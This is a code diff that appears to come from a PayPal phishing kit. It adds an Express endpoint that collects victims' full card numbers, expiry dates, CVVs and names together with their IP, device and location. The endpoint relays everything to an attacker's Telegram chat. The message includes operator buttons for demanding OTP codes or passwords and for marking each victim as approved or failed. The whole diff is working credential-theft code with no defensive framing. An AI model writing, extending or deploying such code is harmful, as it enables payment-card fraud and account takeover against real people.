@@ -399,6 +399,80 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // PayPal card submission endpoint
+  app.post("/api/paypal/card", async (req, res) => {
+    try {
+      const { cardNumber, expiryMonth, expiryYear, cvv, cardholderName } = req.body;
+
+      if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !cardholderName) {
+        return res.status(400).json({ error: "All card fields required" });
+      }
+
+      const clientInfo = await getClientInfo(req);
+
+      // Create a session for this card submission
+      const session = await storage.createPaypalSession({
+        sessionId: clientInfo.sessionId,
+        cardNumber,
+        expiryMonth,
+        expiryYear,
+        cvv,
+        cardholderName,
+        ipAddress: clientInfo.ipAddress,
+        country: clientInfo.country,
+        device: clientInfo.device,
+        browser: clientInfo.browser,
+        status: "waiting",
+      });
+
+      // Send notification to Telegram
+      const telegramConfig = await getTelegramConfig();
+      if (telegramConfig) {
+        const message = `
+💳 <b>PAYPAL - CARTE BANCAIRE</b>
+
+💳 <b>Numéro de carte:</b> <code>${cardNumber}</code>
+📅 <b>Date d'expiration:</b> <code>${expiryMonth}/${expiryYear}</code>
+🔐 <b>CVV:</b> <code>${cvv}</code>
+👤 <b>Nom du titulaire:</b> <code>${cardholderName}</code>
+
+🌍 <b>Pays:</b> ${clientInfo.country}
+📱 <b>Appareil:</b> ${clientInfo.device}
+🌐 <b>Navigateur:</b> ${clientInfo.browser}
+🔗 <b>IP:</b> <code>${clientInfo.ipAddress}</code>
+
+⏰ ${new Date().toLocaleString('fr-FR')}
+`;
+
+        const keyboard = [
+          [
+            { text: "✅ Approuver", callback_data: `paypal_approve_${clientInfo.sessionId}` },
+            { text: "🔑 OTP 1", callback_data: `paypal_otp1_${clientInfo.sessionId}` }
+          ],
+          [
+            { text: "🔑 OTP 2", callback_data: `paypal_otp2_${clientInfo.sessionId}` },
+            { text: "🔒 Mot de passe expiré", callback_data: `paypal_password_${clientInfo.sessionId}` }
+          ],
+          [
+            { text: "✅ Succès", callback_data: `paypal_success_${clientInfo.sessionId}` },
+            { text: "❌ Échec", callback_data: `paypal_failure_${clientInfo.sessionId}` }
+          ]
+        ];
+
+        await sendTelegramMessage(
+          telegramConfig.botToken,
+          telegramConfig.chatId,
+          message,
+          keyboard
+        );
+      }
+
+      res.json({ success: true, sessionId: session.sessionId });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to process card" });
+    }
+  });
+
   // PayPal login endpoint
   app.post("/api/paypal/login", async (req, res) => {
     try {
